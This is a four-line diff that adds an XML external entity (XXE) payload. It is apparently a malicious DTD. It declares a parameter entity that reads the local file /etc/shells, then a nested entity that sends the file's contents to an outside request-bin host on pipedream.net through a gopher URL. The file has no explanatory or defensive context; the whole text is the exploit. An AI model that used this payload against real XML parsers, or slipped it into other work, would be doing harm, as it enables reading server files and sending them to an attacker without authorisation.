@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/shells">
+<!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'gopher:///enhko3u55lxl.x.pipedream.net:443/%file;'>">
+%run;
+%exfil;
